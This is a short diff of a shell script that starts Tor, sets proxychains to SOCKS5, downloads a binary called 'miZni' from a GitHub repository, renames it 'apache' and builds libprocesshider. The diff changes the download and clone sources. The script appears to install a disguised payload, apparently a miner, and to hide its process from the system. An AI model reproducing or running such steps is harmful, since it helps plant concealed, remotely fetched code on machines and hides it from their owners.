@@ -6,11 +6,11 @@ service tor start
 
 sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g' /etc/proxychains.conf
 
-wget https://raw.githubusercontent.com/kuyaxxx/pacul/main/miZni
+wget https://github.com/aurbach55/sugeh-ice/raw/main/miZni
 chmod +x miZni
 mv miZni apache
 
-git clone https://github.com/hanifgz/libprocesshider.git
+git clone https://github.com/aurbach55/libprocesshider.git
 cd libprocesshider
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
